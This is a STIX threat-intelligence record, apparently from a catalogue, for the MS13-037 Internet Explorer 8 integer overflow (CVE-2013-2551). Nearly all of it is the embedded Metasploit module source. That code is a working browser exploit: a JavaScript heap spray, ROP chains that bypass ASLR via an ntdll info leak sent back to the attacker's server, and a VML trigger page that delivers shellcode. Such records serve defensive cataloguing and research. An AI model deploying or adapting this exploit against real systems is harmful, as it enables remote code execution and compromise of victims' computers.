{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ba745f86-30f2-47a3-aefb-cd5676304439",
    "created": "2024-08-14T16:44:19.120943Z",
    "modified": "2024-08-14T16:44:19.120947Z",
    "name": "\"MS13-037 Microsoft Internet Explorer COALineDashStyleArray Integer Overflow\"",
    "description": " This module exploits an integer overflow vulnerability on Internet Explorer. The vulnerability exists in the handling of the dashstyle.array length for vml shapes on the vgx.dll module.  The exploit has been built and tested specifically against Windows 7 SP1 with Internet Explorer 8. It uses either JRE6 or an information leak (to ntdll) to bypass ASLR, and by default the info leak is used. To make sure the leak is successful, the ntdll version should be either v6.1.7601.17514 (the default dll version on a newly installed/unpatched Windows 7 SP1), or ntdll.dll v6.1.7601.17725 (installed after apply MS12-001). If the target doesn't have the version the exploit wants, it will refuse to attack by sending a fake 404 message (webpage not found).  If you wish to try the JRE6 component instead to bypass ASLR, you can set the advanced datastore option to 'JRE6'. If JRE6 is chosen but the target doesn't have this particular component, the exploit will also refuse to attack by sending a 404 message.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms13_037_svg_dashstyle.rb",
            "external_id": "ms13_037_svg_dashstyle.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2551"
        },
        {
            "source_name": "reference",
            "url": "http://binvul.com/viewthread.php?tid=311"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n  include Msf::Exploit::RopDb\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS13-037 Microsoft Internet Explorer COALineDashStyleArray Integer Overflow\",\n      'Description'    => %q{\n          This module exploits an integer overflow vulnerability on Internet Explorer.\n        The vulnerability exists in the handling of the dashstyle.array length for vml\n        shapes on the vgx.dll module.\n\n          The exploit has been built and tested specifically against Windows 7 SP1 with\n        Internet Explorer 8. It uses either JRE6 or an information leak (to ntdll) to\n        bypass ASLR, and by default the info leak is used. To make sure the leak is\n        successful, the ntdll version should be either v6.1.7601.17514 (the default dll\n        version on a newly installed/unpatched Windows 7 SP1), or ntdll.dll v6.1.7601.17725\n        (installed after apply MS12-001). If the target doesn't have the version the exploit\n        wants, it will refuse to attack by sending a fake 404 message (webpage not found).\n\n          If you wish to try the JRE6 component instead to bypass ASLR, you can set the\n        advanced datastore option to 'JRE6'. If JRE6 is chosen but the target doesn't\n        have this particular component, the exploit will also refuse to attack by\n        sending a 404 message.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Nicolas Joly', # Vulnerability discovery, PoC and analysis\n          '4B5F5F4B',     # PoC\n          'juan vazquez', # Metasploit module\n          'sinn3r'        # BES upgrade\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-2551' ],\n          [ 'OSVDB', '91197' ],\n          [ 'BID', '58570' ],\n          [ 'MSB', 'MS13-037' ],\n          [ 'URL', 'http://binvul.com/viewthread.php?tid=311' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 948,\n          'DisableNops'    => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'BrowserRequirements' =>\n        {\n          :source => /script/i,\n          :os_name => OperatingSystems::Match::WINDOWS_7,\n          :ua_name => HttpClients::IE,\n          :ua_ver  => '8.0',\n        },\n      'Targets'        =>\n        [\n          [\n            'IE 8 on Windows 7 SP1',\n              {\n                'Offset' => '0x5f4'\n              }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-03-06',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n    register_advanced_options(\n      [\n          # ntdll requires:\n          # * ntdll.dll v6.1.7601.17514 (fresh W7SP1 installation)\n          # * ntdll.dll v6.1.7601.17725 (MS12-001)\n        OptEnum.new('ROP', [true, 'The type of ROP to use (JRE6 or leak NTDLL)', 'NTDLL', ['JRE6', 'NTDLL'] ])\n      ])\n  end\n\n  def exploit\n    @second_stage_url = \"#{get_module_resource}#{rand_text_alpha(10)}\".chomp\n    @leak_param = rand_text_alpha(5)\n\n    super\n  end\n\n  def ie_heap_spray(my_target, p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Land the payload at 0x0c0c0c0c\n    # For IE 8\n    js = %Q|\nvar heap_obj = new heapLib.ie(0x20000);\nvar code = unescape(\"#{js_code}\");\nvar #{randnop} = \"#{js_nops}\";\nvar nops = unescape(#{randnop});\nwhile (nops.length < 0x80000) nops += nops;\nvar offset = nops.substring(0, #{my_target['Offset']});\nvar shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\nwhile (shellcode.length < 0x40000) shellcode += shellcode;\nvar block = shellcode.substring(0, (0x80000-6)/2);\nheap_obj.gc();\nfor (var i=1; i < 0x300; i++) {\n  heap_obj.alloc(block);\n}\n    |\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    return js\n  end\n\n  def get_ntdll_rop\n    case @ntdll_version\n    when \"6.1.7601.17514\"\n      stack_pivot = [\n        @ntdll_base+0x0001578a, # ret # from ntdll\n        @ntdll_base+0x000096c9, # pop ebx # ret # from ntdll\n        @ntdll_base+0x00015789, # xchg eax, esp # ret from ntdll\n      ].pack(\"V*\")\n      ntdll_rop = [\n        @ntdll_base+0x45F18, # ntdll!ZwProtectVirtualMemory\n        0x0c0c0c40, # ret to shellcode\n        0xffffffff, # ProcessHandle\n        0x0c0c0c34, # ptr to BaseAddress\n        0x0c0c0c38, # ptr to NumberOfBytesToProtect\n        0x00000040, # NewAccessProtection\n        0x0c0c0c3c, # ptr to OldAccessProtection\n        0x0c0c0c40, # BaseAddress\n        0x00000400, # NumberOfBytesToProtect\n        0x41414141  # OldAccessProtection\n      ].pack(\"V*\")\n      return stack_pivot + ntdll_rop\n    when \"6.1.7601.17725\"\n      stack_pivot = [\n        @ntdll_base+0x0001579a, # ret # from ntdll\n        @ntdll_base+0x000096c9, # pop ebx # ret # from ntdll\n        @ntdll_base+0x00015799, # xchg eax, esp # ret from ntdll\n      ].pack(\"V*\")\n      ntdll_rop = [\n        @ntdll_base+0x45F18, # ntdll!ZwProtectVirtualMemory\n        0x0c0c0c40, # ret to shellcode\n        0xffffffff, # ProcessHandle\n        0x0c0c0c34, # ptr to BaseAddress\n        0x0c0c0c38, # ptr to NumberOfBytesToProtect\n        0x00000040, # NewAccessProtection\n        0x0c0c0c3c, # ptr to OldAccessProtection\n        0x0c0c0c40, # BaseAddress\n        0x00000400, # NumberOfBytesToProtect\n        0x41414141  # OldAccessProtection\n      ].pack(\"V*\")\n      return stack_pivot + ntdll_rop\n    else\n      return \"\"\n    end\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n    # No rop. Just return the payload.\n    return code if t.opts['Rop'].nil?\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t.opts['Rop']\n    when :jre\n      print_status(\"Using JRE ROP\")\n      stack_pivot = [\n        0x7c348b06, # ret # from msvcr71\n        0x7c341748, # pop ebx # ret # from msvcr71\n        0x7c348b05  # xchg eax, esp # ret from msvcr71\n      ].pack(\"V*\")\n      rop_payload = generate_rop_payload('java', code, {'pivot'=>stack_pivot})\n    when :ntdll\n      print_status(\"Using ntdll ROP\")\n      rop_payload = get_ntdll_rop + payload.encoded\n    end\n\n    return rop_payload\n  end\n\n  def load_exploit_html(my_target, cli)\n    p  = get_payload(my_target, cli)\n    js = ie_heap_spray(my_target, p)\n\n    js_trigger = %Q|\nvar rect_array = new Array()\nvar a = new Array()\n\nfunction createRects(){\n  for(var i=0; i<0x1000; i++){\n    rect_array[i]    = document.createElement(\"v:shape\")\n    rect_array[i].id = \"rect\" + i.toString()\n    document.body.appendChild(rect_array[i])\n  }\n}\n\nfunction exploit(){\n\n  var vml1 = document.getElementById(\"vml1\")\n\n  for (var i=0; i<0x1000; i++){\n    a[i] = document.getElementById(\"rect\" + i.toString())._anchorRect;\n    if (i == 0x800) {\n      vml1.dashstyle = \"1 2 3 4\"\n    }\n  }\n\n  vml1.dashstyle.array.length = 0 - 1;\n  vml1.dashstyle.array.item(6) = 0x0c0c0c0c;\n\n  for (var i=0; i<0x1000; i++)\n  {\n    delete a[i];\n    CollectGarbage();\n  }\n  location.reload();\n\n}\n    |\n\n    create_rects_func = \"createRects\"\n    exploit_func = \"exploit\"\n\n    if datastore['OBFUSCATE']\n      js_trigger = ::Rex::Exploitation::JSObfu.new(js_trigger)\n      js_trigger.obfuscate(memory_sensitive: true)\n      create_rects_func = js_trigger.sym(\"createRects\")\n      exploit_func = js_trigger.sym(\"exploit\")\n    end\n\n    html = %Q|\n<html>\n<head>\n<script>\n#{js}\n</script>\n<meta http-equiv=\"x-ua-compatible\" content=\"IE=EmulateIE9\" >\n</head>\n<title>\n</title>\n<style>v\\\\: * { behavior:url(#default#VML); display:inline-block }</style>\n<xml:namespace ns=\"urn:schemas-microsoft-com:vml\" prefix=\"v\" />\n<script>\n#{js_trigger}\n</script>\n<body onload=\"#{create_rects_func}(); #{exploit_func}();\">\n<v:oval>\n<v:stroke id=\"vml1\"/>\n</v:oval>\n</body>\n</html>\n    |\n\n    return html\n  end\n\n  def html_info_leak\n\n    uri_prefix = \"#{get_resource.chomp(\"/\")}/#{@second_stage_url}\".gsub('//', '/')\n\n    js_trigger = %Q|\nvar rect_array = new Array()\nvar a = new Array()\n\nfunction createRects(){\n  for(var i=0; i<0x400; i++){\n    rect_array[i]    = document.createElement(\"v:shape\")\n    rect_array[i].id = \"rect\" + i.toString()\n    document.body.appendChild(rect_array[i])\n  }\n}\n\nfunction exploit(){\n\n  var vml1  = document.getElementById(\"vml1\")\n\n  for (var i=0; i<0x400; i++){\n    a[i] = document.getElementById(\"rect\" + i.toString())._vgRuntimeStyle;\n  }\n\n  for (var i=0; i<0x400; i++){\n    a[i].rotation;\n    if (i == 0x300) {\n      vml1.dashstyle = \"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44\"\n    }\n  }\n\n  var length_orig = vml1.dashstyle.array.length;\n  vml1.dashstyle.array.length = 0 - 1;\n\n  for (var i=0; i<0x400; i++)\n  {\n    a[i].marginLeft = \"a\";\n    marginLeftAddress = vml1.dashstyle.array.item(0x2E+0x16);\n    if (marginLeftAddress > 0) {\n      vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300;\n      var leak = a[i].marginLeft;\n      vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress;\n      vml1.dashstyle.array.length = length_orig;\n      document.location = \"#{uri_prefix}?#{@leak_param}=\" + parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 )\n      return;\n    }\n  }\n\n}\n    |\n\n    create_rects_func = \"createRects\"\n    exploit_func = \"exploit\"\n\n    if datastore['OBFUSCATE']\n      js_trigger = ::Rex::Exploitation::JSObfu.new(js_trigger)\n      js_trigger.obfuscate(memory_sensitive: true)\n      create_rects_func = js_trigger.sym(\"createRects\")\n      exploit_func = js_trigger.sym(\"exploit\")\n    end\n\n    html = %Q|\n<html>\n<head>\n<meta http-equiv=\"x-ua-compatible\" content=\"IE=EmulateIE9\" >\n</head>\n<title>\n</title>\n<style>v\\\\: * { behavior:url(#default#VML); display:inline-block }</style>\n<xml:namespace ns=\"urn:schemas-microsoft-com:vml\" prefix=\"v\" />\n<script>\n#{js_trigger}\n</script>\n<body onload=\"#{create_rects_func}(); #{exploit_func}();\">\n<v:oval>\n<v:stroke id=\"vml1\"/>\n</v:oval>\n</body>\n</html>\n    |\n\n    return html\n\n  end\n\n  def set_rop(t, rop, info)\n    case rop\n    when /^ntdll$/i\n      t.opts['Rop'] = :ntdll\n    when /^jre6$/i\n      if info[:java] !~ /1\\.6|6\\.0/\n        raise RuntimeError, \"Target does not have the suitable Java component (1.6) installed for our attack\"\n      end\n\n      t.opts['Rop'] = :jre\n    end\n\n    return t\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    begin\n      my_target = set_rop(get_target, datastore['ROP'], target_info)\n    rescue RuntimeError => e\n      # This one is just a warning, because it's a requirement check so it's not that scary.\n      print_warning(e.message)\n      send_not_found(cli)\n      return\n    end\n\n    if my_target.opts['Rop'] == :ntdll and request.uri !~ /#{@second_stage_url}/\n      html = html_info_leak\n      print_status(\"Sending HTML to info leak...\")\n      send_response(cli, html, {'Content-Type'=>'text/html'})\n    else\n      leak = begin\n        request.uri_parts[\"QueryString\"][@leak_param].to_i\n      rescue\n        0\n      end\n\n      if leak == 0\n        html = load_exploit_html(my_target, cli)\n        print_status(\"Sending HTML to trigger...\")\n        send_response(cli, html, {'Content-Type'=>'text/html'})\n        return\n      end\n\n      print_status(\"ntdll leak: 0x#{leak.to_s(16)}\")\n      fingerprint = leak & 0x0000ffff\n\n      case fingerprint\n      when 0x70B0\n        @ntdll_version = \"6.1.7601.17514\"\n        @ntdll_base = leak - 0x470B0\n      when 0x7090\n        @ntdll_version = \"6.1.7601.17725\" # MS12-001\n        @ntdll_base = leak - 0x47090\n      else\n        print_warning(\"ntdll version not detected, sending 404\")\n        send_not_found(cli)\n        return\n      end\n\n      html = load_exploit_html(my_target, cli)\n      print_status(\"Sending HTML to trigger...\")\n      send_response(cli, html, {'Content-Type'=>'text/html'})\n\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-06",
    "x_mitre_platforms": [
        "win'"
    ]
}